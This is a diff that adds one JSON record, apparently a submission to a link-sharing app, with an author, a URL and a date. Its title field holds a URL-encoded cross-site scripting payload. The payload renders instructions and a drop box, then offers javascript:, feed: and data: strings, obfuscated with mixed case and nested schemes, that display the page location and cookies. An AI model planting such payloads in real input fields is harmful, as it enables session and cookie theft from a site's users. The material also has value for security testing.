@@ -1,0 +1,8 @@
+{
+  "title": "%3cb%3edrag%20and%20drop%20one%20of%20the%20following%20strings%20to%20the%20drop%20box%3a%3c%2fb%3e%3cbr%2f%3e%3chr%2f%3ejAvascript%3aalert('Top%20Page%20Location%3a%20'%2bdocument%2elocation%2b'%20Host%20Page%20Cookies%3a%20'%2bdocument%2ecookie)%3b%2f%2f%3cbr%2f%3e%3chr%2f%3efeed%3ajavascript%3aalert('Top%20Page%20Location%3a%20'%2bdocument%2elocation%2b'%20Host%20Page%20Cookies%3a%20'%2bdocument%2ecookie)%3b%2f%2f%3cbr%2f%3e%3chr%2f%3efeed%3adata%3atext%2fhtml,%26%23x3c%3bscript%3ealert('Top%20Page%20Location%3a%20'%2bdocument%2elocation%2b'%20Host%20Page%20Cookies%3a%20'%2bdocument%2ecookie)%26%23x3c%3b%2fscript%3e%26%23x3c%3bb%3e%3cbr%2f%3e%3chr%2f%3efeed%3afeed%3ajavAscript%3ajavAscript%3afeed%3aalert('Top%20Page%20Location%3a%20'%2bdocument%2elocation%2b'%20Host%20Page%20Cookies%3a%20'%2bdocument%2ecookie)%3b%2f%2f%3cbr%2f%3e%3chr%2f%3e%3cdiv%20id%3d%22dropbox%22%20style%3d%22height%3a%20360px%3bwidth%3a%20500px%3bborder%3a%205px%20solid%20%23000%3bposition%3a%20relative%3b%22%20ondragover%3d%22event%2epreventDefault()%22%3e%2b%20Drop%20Box%20%2b%3c%2fdiv%3e",
+  "author": {
+    "name": "Pieere"
+  },
+  "url": "http://google.com",
+  "submittedOn": "2023-01-25T10:06:51.479Z"
+}
